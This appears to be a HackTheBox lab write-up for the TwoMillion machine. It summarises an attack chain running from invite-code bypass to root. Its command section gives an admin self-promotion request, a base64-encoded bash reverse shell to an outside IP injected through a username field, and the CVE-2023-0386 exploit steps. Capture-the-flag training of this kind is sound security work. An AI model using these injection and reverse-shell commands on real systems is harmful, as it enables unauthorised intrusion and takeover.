# HTB: TwoMillion

**Difficulty:** Medium
**OS:** Linux
**IP:** 10.129.26.217
**Status:** ✅ Pwned

---

## Summary

TwoMillion is a medium Linux machine replicating the legacy HackTheBox platform. The attack chain begins with JavaScript deobfuscation to bypass an invite-code gate, followed by API enumeration that exposes unauthenticated admin endpoints. Broken access control allows self-promotion to admin, and an unsanitised VPN generation endpoint enables OS command injection to gain a foothold as `www-data`. A world-readable `.env` file exposes plaintext credentials reused as the OS admin password, enabling lateral movement. Finally, the unpatched kernel (5.15.70) is vulnerable to CVE-2023-0386 (OverlayFS privilege escalation), yielding a root shell.

---

## Attack Chain

```
JS Deobfuscation → Invite Code Bypass → API Enumeration → Broken Access Control (is_admin:1) → Command Injection (RCE) → .env Credential Harvest → Lateral Movement → CVE-2023-0386 → root
```

---

## Flags

| Flag | Value |
|------|-------|
| User | ✅ Captured |
| Root | ✅ Captured |

---

## Vulnerabilities

| # | Vulnerability | Severity |
|---|--------------|----------|
| 1 | Broken Access Control — Unauthenticated admin API promotion | Critical |
| 2 | OS Command Injection — RCE via VPN generation endpoint | Critical |
| 3 | Kernel PrivEsc — CVE-2023-0386 (OverlayFS) | Critical |
| 4 | Credential Exposure — Plaintext secrets in `.env` | High |
| 5 | Missing HttpOnly Cookie Flag | Low |

---

## Tools Used

- `nmap` — port scanning
- `curl` — API enumeration and exploitation
- `CyberChef` — ROT13 decode
- `netcat` — reverse shell listener
- `python3 -m http.server` — file transfer to target
- CVE-2023-0386 exploit — kernel privilege escalation

---

## Key Commands

```bash
# Bypass invite code — trigger API endpoint via browser console
makeInviteCode()
# POST to generate invite code (Base64-encoded response)
curl -X POST http://2million.htb/api/v1/invite/generate

# Broken access control — self-promote to admin
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=<session>" -H "Content-Type: application/json" \
  -d '{"is_admin": 1, "email": "test@test.com"}'

# OS command injection — base64-encoded reverse shell to bypass filtering
echo 'bash -i >& /dev/tcp/10.10.14.9/4444 0>&1' | base64
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=<session>" -H "Content-Type: application/json" \
  -d '{"username": "4ss3m;echo <B64_PAYLOAD>= | base64 -d | bash"}'

# Privilege escalation via CVE-2023-0386
make && mkdir -p ovlcap/lower
./fuse ./ovlcap/lower ./gc &
./exp
```

---

## Files

| File | Description |
|------|-------------|
| `TwoMillion_Pentest_Report.pdf` | Full penetration test report |
| `nmap_scan.txt` | Nmap scan results |
| `screenshots/` | Step-by-step exploitation screenshots |
